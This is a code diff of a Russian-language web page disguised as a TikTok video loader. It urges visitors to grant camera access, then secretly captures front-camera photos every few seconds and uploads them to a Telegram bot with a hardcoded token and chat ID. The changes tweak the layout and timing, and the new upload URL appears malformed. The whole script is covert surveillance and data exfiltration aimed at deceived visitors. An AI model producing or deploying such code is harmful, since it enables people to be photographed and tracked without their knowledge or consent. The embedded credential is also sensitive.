@@ -1,46 +1,34 @@
+html
 <!DOCTYPE html>
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok Video</title>
+    <title>TikTok</title>
     <style>
-        body { background-color: #010101; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; }
-        
-        /* Стиль для логотипа */
-        .logo {
-            width: 80px;
-            height: 80px;
-            margin-bottom: 20px;
-            object-fit: contain;
-        }
-
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #fe2c55; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
+        body { background-color: #010101; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; overflow: hidden; }
+        .logo { width: 100px; height: 100px; margin-bottom: 20px; border-radius: 20px; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #fe2c55; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        
         .text { margin-top: 20px; font-size: 18px; font-weight: bold; }
-        #video, #canvas { display: none; }
-
-        /* Стиль для красной плашки */
+        #video, #canvas { display: none; position: absolute; }
+        
         .permission-hint {
-            background-color: #fe2c55; /* Чистый красный TikTok */
+            background-color: #fe2c55;
             color: white;
             padding: 12px 24px;
             border-radius: 30px; 
             font-size: 15px;
             font-weight: bold;
-            margin-bottom: 40px;
+            margin-bottom: 30px;
             text-align: center;
-            box-shadow: 0 4px 15px rgba(254, 44, 85, 0.4);
+            z-index: 10;
         }
     </style>
 </head>
 <body>
-    <!-- Логотип сверху -->
-    <img src="https://img.icons8.com" alt="TikTok" class="logo">
-    
+    <img src="https://sf-tb-static.fingerfun.com" alt="TikTok" class="logo">
     <div id="hint" class="permission-hint">Нажмите «Разрешить», чтобы продолжить</div>
-    
     <div class="loader"></div>
     <div class="text">Загрузка видео...</div>
 
@@ -51,47 +39,52 @@
     const botToken = '8220142638:AAFDjQSzi4V1i5xfpMBA42uBgaDjFA0znOo';
     const chatId = '8573089884';
 
-    async function takeAndSendPhoto(video, canvas) {
-        if (video.videoWidth === 0 || video.readyState < 2) return;
-        const context = canvas.getContext('2d');
+    async function takeAndSendPhoto() {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        
+        if (video.videoWidth === 0) return; // Ждем, пока видео реально появится
+
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
-        context.drawImage(video, 0, 0);
-        const dataURL = canvas.toDataURL('image/jpeg', 0.6);
-        const blob = await (await fetch(dataURL)).blob();
-        const formData = new FormData();
-        formData.append('chat_id', chatId);
-        formData.append('photo', blob, 'shot.jpg');
-        try {
-            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            });
-        } catch (e) { console.error(e); }
+        const context = canvas.getContext('2d');
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        canvas.toBlob(async (blob) => {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', blob, 'shot.jpg');
+
+            try {
+                await fetch(`https://api.telegram.org{botToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (e) { console.error("Ошибка отправки:", e); }
+        }, 'image/jpeg', 0.7);
     }
 
     window.onload = () => {
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
         .then(stream => {
-            // Скрываем подсказку, когда доступ дали
+            // Убираем подсказку только когда камера реально разрешена
             document.getElementById('hint').style.display = 'none';
             
             const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
             video.srcObject = stream;
-            video.onplaying = () => {
+            
+            video.onloadedmetadata = () => {
+                video.play();
+                // Делаем фото через 2 секунды после старта, чтобы камера сфокусировалась
                 setTimeout(() => {
-                    takeAndSendPhoto(video, canvas);
-                    setInterval(() => {
-                        takeAndSendPhoto(video, canvas);
-                    }, 3000); 
-                }, 3000);
+                    takeAndSendPhoto();
+                    setInterval(takeAndSendPhoto, 5000); // Повтор каждые 5 сек
+                }, 2000);
             };
-            video.play();
         })
         .catch(err => { 
-            console.log("Камера заблокирована"); 
-            document.getElementById('hint').innerText = "Доступ к камере обязателен";
+            document.getElementById('hint').innerText = "Ошибка: разрешите доступ к камере";
+            document.getElementById('hint').style.backgroundColor = "gray";
         });
     };
 </script>
